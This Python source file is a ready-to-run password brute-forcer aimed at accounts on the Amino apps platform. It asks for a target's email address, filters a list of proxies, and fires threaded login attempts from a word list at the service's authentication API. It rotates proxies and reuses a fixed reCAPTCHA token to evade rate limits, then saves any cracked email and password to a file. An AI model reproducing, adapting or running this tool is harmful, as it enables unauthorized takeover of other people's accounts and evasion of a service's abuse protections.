import requests
import threading
import time
import random
session = requests.session()

try:
	proxies = open('proxies.txt','r')
except:
	print('Missing proxy file ...')
	exit()

try:
	word_list = open('words.txt','r')
except:
	print('Missing word list ...')
	exit()


words_collection = word_list.readlines()
length_wordList = len(words_collection)
print('Word List Size: ' + str(length_wordList))


proxy_collection = proxies.readlines()
length_proxies = len(proxy_collection)

print('Proxy List Size: ' + str(length_proxies))

emailIsVaild = False

global emailToUse
emailToUse = ''
while emailIsVaild == False:
	emailToUse = input('Email Address of Target: ')
	if len(emailToUse.replace(' ','')) == 0:
		print('Email is blank, try again ...')
	else:
		emailIsVaild = True
		break

print('Your proxy list will be now be checked ...') 

global final_proxyCollection
final_proxyCollection = []

global deadProxies
global aliveProxies

deadProxies = 0
aliveProxies = 0

def testProxy (proxy):
	proxy = proxy.replace('\n','')
	_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	try:
		requests.get('http://www.google.com',proxies=_testProxy,timeout=2.5)
		print('Found an alive proxy: ' + str(proxy))
		globals()['aliveProxies'] += 1
		print('Alive Proxies: ' + str(globals()['aliveProxies']))
		print('Dead Proxies: ' + str(globals()['deadProxies']))
		final_proxyCollection.append(proxy)
		return {'proxy':proxy,'status':'alive'}
	except:
		print('Found Dead Proxy: ' +str(proxy))
		globals()['deadProxies'] += 1
		print('Alive Proxies: ' + str(globals()['aliveProxies']))
		print('Dead Proxies: ' + str(globals()['deadProxies']))
		return {'proxy':proxy,'status':'dead'}


print('Testing for dead proxies ...')
for proxy in proxy_collection:
	print('Testing Proxy: ' + str(proxy))
	t = threading.Thread(target=testProxy,args=(proxy,))

	t.start()
	time.sleep(.25)

print('All threads have been created ...')
print('Waiting 10 seconds for threads to finish up...')
time.sleep(10)

print('\n\nProxies Checked')
print('Alive Proxies: ' + str(aliveProxies))
print('Dead Proxies: ' + str(deadProxies))

print('Brute force operation will begin in 15 seconds ...\nCancel now (CTRL+C) if you do not wish to continue with this')
time.sleep(15)

print('Brtue forcing now!\n\n\n\n\n\n\n...')

#print(words_collection)

correctPassword = []

def amino_pass(proxy, password,email):
	_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	recaptcha_version = 'v3'
	recaptcha_challenge = "03AOLTBLTAc9t-dPiTwwy6Oq2PvB0jIa-HAQjbo3Q6Grjm89PyR7SLSuDupcW1GME8mcz5KNxjhHBnrfO_dwp6F7lmNGueYECdNfWm3i0KP9EIwCqsFalQw_SOUdlZ47WTQxc35r-ufNsMijK6Kxt8AyMElk9VKM-DMWcr6Q6nwc2vACeumYh7QaC80CpTDcCcQngc8fd5ORWgJJiz_GNVYDKU2fEODHNKRhF6-enRfKPOgakANIuouV2zM3iT3rhvTe_cYRs1sfb_PPByZrWKE4p7_NNsOp4SbfqOZ8XhRigBWE3D3UZ2YMpVBaiSY0SJkiVop2hK65kWXjv2-jHVkMWUsmVYSP9dtCkpaMWAZPLD-o27XWb8TfG3mq2bHccimA4v_KkObv0DqTr9xrmjacXScybsKQms2bIne9j5GFYQw5y7l_gHLXbNcIAAAVZNU-NKttDglIVyKt0vKOTltwn73S-y8HM4fGKryaiX9jzvOBa5v57N3xXwwEWLouPyw50V1y_oGUm6"
	_jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,'email':email}
	try:
		while True:
			try:
				print('Attempt password try..')
				rQ = requests.post('https://aminoapps.com/api/auth',json=_jsonData,proxies=_testProxy)
				break
			except:
				print(final_proxyCollection)
				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
				_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	except:
		print('[Thread with pass: ' +str(password)+'] Connection failed...')
		return False

	try: 
		rQ.json()['result']
	except:
		print(rQ.json())
		print('[Thread with pass: ' +str(password)+'] Instant failure !'); 
		return False

	print(rQ.json()['result'])

	if 'nickname' in rQ.json()['result']:
		print('Password was correct!')
		passwordFound = open('password_result.txt','w+')
		passwordFound.write(str(str(email)+':'+str(password)))
		passwordFound.close()
		print('\n\n\n\n\n!!!! PASSWORD FOUND !!!!')
		print('PASSWORD = ' + str(password))
		exit()
		return True
	elif 'title' in rQ.json()['result']:
		print('\n'+'-'*32+'Email verification required!\nPassword was: ' + str(password)+'\nURL for Verification: ' +str(rQ.json()['result']['url'])+'\n'+'-'*32)
		passwordFound = open('password_result.txt','w+')
		passwordFound.write(str(str(email)+':'+str(password)))
		passwordFound.close()
		exit()
		return True
	else:
		print('Failed!')
		return False


for word in words_collection:
	print('Attempting to use password: ' +str(word).replace('\n',''))
	word = str(word).replace('\n','')
	proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
	x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))

	x.start()
	time.sleep(1)

x.join()
print('Finished')
print('Waiting 25 seconds for remaining threads to finish...')
time.sleep(25)